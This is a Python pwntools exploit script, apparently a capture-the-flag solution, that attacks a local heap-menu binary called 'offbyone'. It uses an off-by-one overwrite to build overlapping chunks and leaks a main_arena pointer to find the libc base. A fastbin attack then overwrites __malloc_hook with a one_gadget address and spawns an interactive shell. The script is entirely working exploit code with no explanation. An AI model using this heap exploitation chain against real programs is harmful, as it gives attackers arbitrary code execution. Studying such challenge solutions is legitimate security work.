from pwn import *
p=process('./offbyone')
gdb.attach(p)
def add(x):
	p.recvuntil('>> ')
	p.sendline('1')
	p.recvuntil('length: ')
	p.sendline(str(len(x)))
	p.recvuntil('your note:\n')
	p.sendline(x)

def edit(idx,x):
	p.recvuntil('>> ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(idx))
	p.recvuntil('your note:\n')
	p.sendline(x)

def dele(idx):
	p.recvuntil('>> ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(idx))

def show(idx):
	p.recvuntil('>> ')
	p.sendline('4')
	p.recvuntil('index: ')
	p.sendline(str(idx))
	
add(0x28*'a')
add(0xf8*'b')
add(0x68*'c')
add(0x60*'d')
dele(1)
edit(0,0x28*'a'+'\x71'+'\x01')
edit(2,0x60*'c'+p64(0x170)+'\x70')
add(0xf8*'0')
show(2)
main_arena_88=u64(p.recv(6).ljust(8,'\x00'))
log.info('main_arena+88 > '+hex(main_arena_88))
libc_base=main_arena_88-0x3c4b78
log.info('libc_base > '+hex(libc_base))
malloc_hook=libc_base+0x3c4b10
log.info('malloc_hook > '+hex(malloc_hook))
free_hook=libc_base+0x3c67a8
log.info('free_hook > '+hex(free_hook))
#edit(2,p64(malloc_hook)+p64(malloc_hook))
add(0x68*'a')
one_gadget=0x45216+libc_base
one_gadget=0x4526a+libc_base
one_gadget=0xf02a4+libc_base
#one_gadget=0xf1147+libc_base
log.info('one_gadget > '+hex(one_gadget))
dele(3) 
dele(2) #chunk[2] move from unsorted bin -> fastbins
'''
edit(4,p64(free_hook-0x13)[0:6])
'''
edit(4,p64(malloc_hook-0x13)[0:6])
add(0x68*'a')
add(3*'0'+p64(one_gadget)+'\n'*85)
dele(3)
p.interactive()
